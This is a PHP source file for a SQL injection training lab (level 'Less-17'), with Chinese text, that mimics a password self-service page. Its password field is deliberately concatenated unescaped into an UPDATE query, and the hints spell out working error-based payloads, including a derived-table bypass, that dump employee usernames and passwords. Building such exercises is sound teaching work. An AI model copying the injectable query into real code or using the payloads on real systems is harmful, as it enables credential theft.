<?php
// Less-17 员工自助密码修改（uname 过滤严格，新密码直接进 UPDATE 语句 → UPDATE 报错注入）
if (!defined('SQLI_MALL')) { die('forbidden'); }

function less17_check_input($conn, $value)
{
    if (!empty($value)) {
        $value = substr($value, 0, 15);   // 截断到 15 位
    }
    if (!ctype_digit($value)) {
        $value = "'" . mysqli_real_escape_string($conn, $value) . "'";
    } else {
        $value = intval($value);
    }
    return $value;
}

return [
  'title' => '密码修改（自助服务）',
  'desc'  => '未接入统一认证的老版自助服务：输入登录名与新密码即可完成修改。登录名字段有严格的输入校验。',
  'method' => 'POST',
  'form' => ['method' => 'POST', 'fields' => ['uname' => '登录名', 'passwd' => '新密码'], 'submit' => '提交修改'],
  'difficulty' => 3,
  'task' => '登录名被过滤得死死的？检查另一个参数——它直接拼进了 UPDATE 语句，把 oa_employee 里 admin 的密码读出来',
  'hints' => [
    '登录名栏做了截断和转义，基本打不动。但“新密码”这个参数是原样拼进 UPDATE 语句的，没有任何处理。',
    'UPDATE 语句注入：新密码值里闭合单引号，让报错函数把数据带出来。注意要先有一个真实存在的登录名（如 admin），UPDATE 才会执行。',
    "先试：uname=admin&passwd=1' and extractvalue(1,concat(0x7e,database(),0x7e))-- -  会报 1093（不能在 UPDATE 同一张表的子查询里读它自己）。绕过办法是套一层派生表：uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from (select username,password from oa_employee) x),0x7e))-- -",
  ],
  'run' => function ($app) {
    if (!isset($_POST['uname']) || !isset($_POST['passwd'])) return $app->info('请输入登录名与新密码。');
    $uname  = less17_check_input($app->conn, $_POST['uname']);
    $passwd = $_POST['passwd'];
    $res = $app->q("SELECT username FROM oa_employee WHERE username= $uname LIMIT 0,1");
    $row = $app->fetch($res);
    if ($row) {
      $app->q("UPDATE oa_employee SET password = '$passwd' WHERE username='" . $row['username'] . "'");
      if ($app->error()) {
        return $app->note($app->error());
      }
      return $app->info('密码已成功更新，请使用新密码登录。');
    }
    return $app->info('登录名不存在，请核对工号后重试。');
  },
];
